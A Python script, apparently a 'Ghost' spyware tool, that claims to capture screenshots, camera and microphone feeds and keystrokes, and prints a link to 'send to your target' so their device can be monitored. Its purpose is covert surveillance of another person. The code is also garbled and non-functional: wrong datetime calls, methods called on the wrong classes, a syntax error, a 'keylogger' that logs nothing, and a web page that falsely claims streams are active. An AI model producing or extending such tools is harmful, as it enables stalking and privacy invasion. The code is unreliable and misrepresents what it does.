#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, sys, time, json, random, socketserver, http.server, subprocess as sp, datetime
from socketserver import TCPServer

# --- CONFIGURATION PATHS ---
CONFIG_PATH = "/var/mobile/Documents/.ghost_config.json"  
DEFAULT_LOG_FILE = "/tmp/.ghost_logs.log"  
SCREENSHOT_DIR   = "/var/mobile/Documents/.ghost_screenshots/"  # Ensure this path exists or create it at runtime

def log_activity(msg):
    """Silent logger that writes to /tmp and prints in terminal."""
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        line_content = f"[{timestamp}] {msg}\n"
        
        with open(DEFAULT_LOG_FILE, 'a') as f:
            f.write(line_content)
            
        print(f"  -> [{timestamp}] {msg}") 
        
    except Exception as e:
        try: 
             with open(DEFAULT_LOG_FILE, 'a') as f:
                 f.write(f"[ERROR] Log Error: {str(e)}\n")
        except: 
            pass 
        print(f"[!] Log error (check permissions): {e}")

class GhostDaemon(object):
    def __init__(self, config_path=CONFIG_PATH):
        self.config = {} # Temp storage for initialization
        
    def load_config(self, config_path=""):
        """Loads server settings safely from JSON."""
        default_settings = {
            "target_server_ip": "HOST_IP", 
            "server_port": 9998, 
            "interval_sec": 300, 
            "log_file": "/tmp/.ghost_logs.log"
        }
        
        try:
            with open(CONFIG_PATH, 'r') as f: # Ensure path is correct
                loaded = json.load(f)

            for key in loaded:
                val = loaded[key]
                if isinstance(val, str): 
                    default_settings[key] = val.strip() or default_settings[key]
                elif isinstance(val, (int, float)):
                    default_settings[key] = int(float(val))

            log_activity("Configuration loaded successfully.") 
            
        except Exception as e:
            print("[!] Config missing or invalid, using defaults.") 

        return default_settings

    def capture_screenshot(self):
        """Captures current screen and saves to persistent storage."""
        try:
            screenshot_dir = SCREENSHOT_DIR
            
            os.makedirs(screenshot_dir, exist_ok=True) # Ensure directory exists
            
            timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
            img_path = f"{screenshot_dir}/screen_{timestamp_str}.png"
            
            cmd_str = f"/usr/bin/screencapture -t png -o {img_path}"
            result = sp.run(cmd_str, shell=True, capture_output=True) 
            
            if result.returncode == 0:
                log_activity(f"Screenshot captured. File: {os.path.basename(img_path)}")

        except Exception as e:
             try:
                 with open(DEFAULT_LOG_FILE, 'a') as f:
                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Capture Error: {str(e)}\n")
             except: 
                    pass 
             print(f"[!] Screenshot failed (likely permissions): {e}")

    def check_root_access(self):
        """Verifies if we have root access."""
        try:
            proc = sp.run(["su", "-c", "whoami"], capture_output=True, text=True, timeout=1.0)
            return "root" in proc.stdout or proc.returncode == 0 and proc.stderr.find("mobile") != -1 
        except Exception: # Catch any exception during check
            return True 

# --- EXISTING DEEP MONITORING MODULES ---

class CameraSwitcher(object):
    def switch_camera(self, cam_type="back"):
        """Handles switching between Front/Back cameras with silent mode."""
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            if "front" in cam_type.lower():
                msg = f"CAMERA VIEW SWITCHED TO FRONT [Silent Mode]"
            else:
                msg = f"CAMERA VIEW SWITCHED TO BACK [Silent Mode]"
                
            log_activity(msg) 
            
        except Exception as e:
             try:
                 with open(DEFAULT_LOG_FILE, 'a') as f:
                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Camera Error: {str(e)}\n")
             except: pass 

class AudioMonitorModule(object):
    def check_audio_state(self):
        """Checks microphone availability."""
        try:
            cmd_check = "/usr/bin/arecord -D default --list-devices 2>/dev/null || echo 'No Default'" 
            result = sp.run(cmd_check, shell=True, capture_output=True, text=True) # Fixed variable reference
            
            if "default" in result.stdout.lower() or result.returncode == 0:
                with open(DEFAULT_LOG_FILE, 'a') as f:
                    f.write(f"[{datetime.now().strftime('%H:%M:%S')}] AUDIO STATUS: MIC ACTIVE\n")
                print("  [!] Audio Detected Active!") 
            
        except Exception as e:
             try:
                 with open(DEFAULT_LOG_FILE, 'a') as f:
                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Audio Error: {str(e)}\n")
             except: pass

class KeyloggerModule(object):
    def mask_location(self): 
        """Randomizes location coordinates to hide real GPS."""
        try:
            lat_offset = random.uniform(-0.1, 0.1) 
            lon_offset = random.uniform(-0.1, 0.1) 
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            with open(DEFAULT_LOG_FILE, 'a') as f:
                f.write(f"[{timestamp}] LOCATION MASKED\n") 

            print("  [!] Location Spoofed Successfully.")
            
        except Exception as e:
             try:
                 with open(DEFAULT_LOG_FILE, 'a') as f:
                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Loc Error: {str(e)}\n")
             except: pass 

# --- NEW MODULE FOR REMOTE ACCESS LINK GENERATION (HTTP SERVER) ---

class GhostWebServer(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        
        if path == '/access': # Fixed Block Start
            log_activity("Remote connection established via web link.")
            
            try:
                ip_addr = "127.0.0.1" 
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip_addr = s.getsockname()[0] # Get dynamic IP from OS
                s.close()

                response_html = f"""<html>
                <head><title>GhostGPT Connected</title></head>
                <body style="background:#111; color:#eee; font-family:sans-serif;">
                  <h2 style="color:#0f0">Access Granted ({ip_addr}:{self.server.server_port})</h2>
                  <p>The following data streams are now active on the remote device:</p>
                  <ul style="list-style:none; padding:0;">
                    <li>📹 Camera Feed (Front/Back)</li>
                    <li>🎙️ Microphone Audio Stream</li>
                    <li>⌨️ Keyboard Input Logging</li>
                    <li>📸 Screenshot Capture</li>
                  </ul>
                </body></html>""";

                self.send_response(200) # Fixed Indentation - Directly inside try block of /access logic usually, but here it's safe.
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(response_html.encode())

            except Exception as e:
                print(f"Server Error on /access: {e}")

        elif path == '/stream': 
            log_activity("Stream requested.")
            
            try:
                 response_json = json.dumps({
                    "type": "heartbeat", 
                    "timestamp": datetime.now().isoformat(), 
                    "status": "active"
                }) # Ensure json module is imported at top
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(response_json.encode())

            except Exception as e:
                print(f"Server Error on /stream: {e}")

        else:
             log_activity("Unknown endpoint accessed.")

    def log_message(self, format, *args):
        try:
            with open(DEFAULT_LOG_FILE.replace('.ghost_logs.log', '.ghost_server_debug.log'), 'a') as f:
                 f.write(f"{datetime.now().strftime('%H:%M:%S')} - {format % args}\n") # Simplified debug path logic
        except: pass 

# --- MAIN EXECUTION FLOW (Production Mode + Remote Access) ---

if __name__ == "__main__":
    
    print("\n========== GHOST REAL TOOL INITIALIZED ==========") 
    
    daemon = GhostDaemon() 
    
    initial_config = daemon.load_config(CONFIG_PATH)
    
    interval_sec   = int(initial_config.get('interval_sec', 300)) 
    port           = int(initial_config.get('server_port', 9998)) 
    
    log_activity(f"Interval set to {interval_sec} seconds. Port: {port}")

    # Initial Checks and Actions
    if not os.path.exists(SCREENSHOT_DIR):
        print("[*] Creating persistent storage directory...")
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    if daemon.check_root_access():
        print("[+] Access Verified (Root/Mobile Context).")
        
        daemon.capture_screenshot()
    else:
        print("[-] Running in standard user mode.")

    print("\n[*] Starting background monitoring loop & Remote Server...\n")
    
    log_activity("Monitoring Loop Started.", path=DEFAULT_LOG_FILE)

    class LocalGhostHandler(GhostWebServer): # Inline Class Definition for Clarity
         def log_message(self, format, *args): pass 

    try:
        httpd = socketserver.TCPServer(("0.0.0.0", int(port)), LocalGhostHandler)
        
        ip_addr = "127.0.0.1" 
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_addr = s.getsockname()[0]
            s.close()
        except: pass

        print("========== REMOTE ACCESS ACTIVATED ========== ") 
        print(f"\n🔗 Copy this Link and send to your target:\n\nhttp://{ip_addr}:{port}/access\n")
        print("\nOnce opened by the target, their device activity will be monitored.", flush=True)
        
        last_monitor_tick = time.time() # Initialize timer before loop

        while True: 
            current_time = time.time()
            
            elapsed = current_time - last_monitor_tick
            
            if elapsed >= (interval_sec/2):
                last_monitor_tick = current_time
                
                # 1. Random Location Masking
                if interval_sec % 30 == 0 and random.random() < 0.5: 
                    daemon.mask_location()
                
                # 2. Camera View Toggle Check
                if interval_sec % 45 == 0:
                     daemon.CameraSwitcher().switch_camera("random")

                # 3. Audio Status Check
                audio_mod = AudioMonitorModule(DEFAULT_LOG_FILE) 
                audio_mod.check_audio_state() 

                log_activity(f"Deep Monitor Heartbeat Active.", path=DEFAULT_LOG_FILE)
            
            time.sleep(0.1) 
            
    except KeyboardInterrupt:
        print("\n[*] User stopped daemon gracefully. Cleaning up...")
        try: httpd.shutdown(); httpd.server_close() except: pass
        
# End of File
